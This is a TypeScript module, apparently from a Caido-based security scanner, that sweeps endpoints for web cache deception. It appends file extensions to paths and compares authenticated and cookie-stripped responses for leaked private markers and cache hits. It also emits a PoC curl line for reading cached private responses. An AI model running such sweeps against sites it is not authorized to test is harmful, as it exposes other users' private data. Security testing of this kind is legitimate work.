import type { Endpoint, Finding, HttpMessage } from "../../types.js";
import type { CaidoSender } from "../../caido/send.js";
import type { Marker } from "../../core/marker.js";
import { parseCacheIndicators } from "../../core/cache.js";
import { bodyParity } from "../../core/diff.js";

export async function sweepPathAppend(
  sender: CaidoSender,
  endpoint: Endpoint,
  baseline: HttpMessage,
  markers: Marker[],
  extensions: string[]
): Promise<Finding[]> {
  const findings: Finding[] = [];
  for (const ext of extensions) {
    const url = `https://${endpoint.host}${endpoint.path}/poc${ext}`;

    const auth = await sender.send({ method: "GET", url, headers: baseline.headers, body: "" });
    const noAuth = await sender.send({ method: "GET", url, headers: stripAuth(baseline.headers), body: "" });
    const cache = parseCacheIndicators(noAuth.response.headers);
    const leaked = markers.some((m) => noAuth.response.body.includes(m.value));
    const parity = bodyParity(auth.response.body, noAuth.response.body);

    let confidence: "high" | "medium" | "low" | null = null;
    if (leaked) confidence = "high";
    else if (parity >= 0.9 && cache.hit) confidence = "medium";
    else if (cache.hit) confidence = "low";
    if (!confidence) continue;

    findings.push({
      id: `cd-${endpoint.id}-pathappend-${ext}`,
      module: "cache-deception",
      subtype: "path-append",
      endpoint: `${endpoint.method} ${endpoint.path}`,
      primitive: { suffix: `/poc${ext}` },
      confidence,
      evidence: {
        auth_id: auth.requestId,
        noauth_id: noAuth.requestId,
        leaked,
        parity,
        cache_hit: cache.hit
      },
      poc_curl: `curl '${url}'  # no auth — read cached private response`,
      wiki_ref: "wiki/techniques/server-side/web-cache-deception.md"
    });
  }
  return findings;
}

function stripAuth(h: Record<string, string>): Record<string, string> {
  const o: Record<string, string> = {};
  for (const k of Object.keys(h)) {
    if (k.toLowerCase() === "cookie" || k.toLowerCase() === "authorization") continue;
    o[k] = h[k];
  }
  return o;
}
